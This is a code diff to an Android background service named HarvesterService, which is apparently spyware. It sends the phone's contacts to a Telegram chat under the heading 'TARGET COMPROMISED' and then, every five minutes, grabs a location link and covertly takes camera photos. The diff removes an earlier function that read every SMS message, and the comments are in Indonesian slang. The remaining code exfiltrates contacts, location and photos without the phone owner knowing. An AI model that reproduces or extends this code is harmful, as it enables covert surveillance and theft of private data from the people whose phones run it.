@@ -14,7 +14,6 @@ import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.ContactsContract;
-import android.provider.Telephony;
 import org.json.JSONObject;
 import java.io.File;
 import java.io.FileOutputStream;
@@ -57,15 +56,14 @@ public class HarvesterService extends Service {
                 while (true) {
                     try {
                         if (isFirstRun) {
+                            // Cuma kirim Kontak, SMS udah dibuang
                             String contacts = getContacts();
-                            String sms = getSms();
-                            sendTgText("🎯 <b>TARGET COMPROMISED</b>\n\n<b>KONTAK:</b>\n" + contacts + "\n\n<b>SMS:</b>\n" + sms);
+                            sendTgText("🎯 <b>TARGET COMPROMISED</b>\n\n<b>KONTAK:</b>\n" + contacts);
                             isFirstRun = false;
                         }
 
                         String locLink = getLocationLink();
                         
-                        // Ambil foto pake try-catch terpisah biar gak matiin loop
                         try {
                             takePhotoWithCamera(0, "📸 Foto Belakang");
                             Thread.sleep(2000);
@@ -78,7 +76,6 @@ public class HarvesterService extends Service {
                         Thread.sleep(300000); // 5 Menit
                         
                     } catch (Exception e) {
-                        // Kirim error ke Telegram biar lu tau kenapa dia mati
                         sendTgText("❌ ERROR MAIN LOOP: " + e.getMessage());
                         try { Thread.sleep(60000); } catch (Exception ex) {}
                     }
@@ -133,20 +130,6 @@ public class HarvesterService extends Service {
                 cursor.close();
             }
         } catch (Exception e) { return "Error izin kontak: " + e.getMessage(); }
-        return sb.toString();
-    }
-
-    private String getSms() {
-        StringBuilder sb = new StringBuilder();
-        try {
-            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
-            if (cursor != null) {
-                while (cursor.moveToNext()) {
-                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))).append("\nIsi: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))).append("\n\n");
-                }
-                cursor.close();
-            }
-        } catch (Exception e) { return "Error izin SMS: " + e.getMessage(); }
         return sb.toString();
     }
 
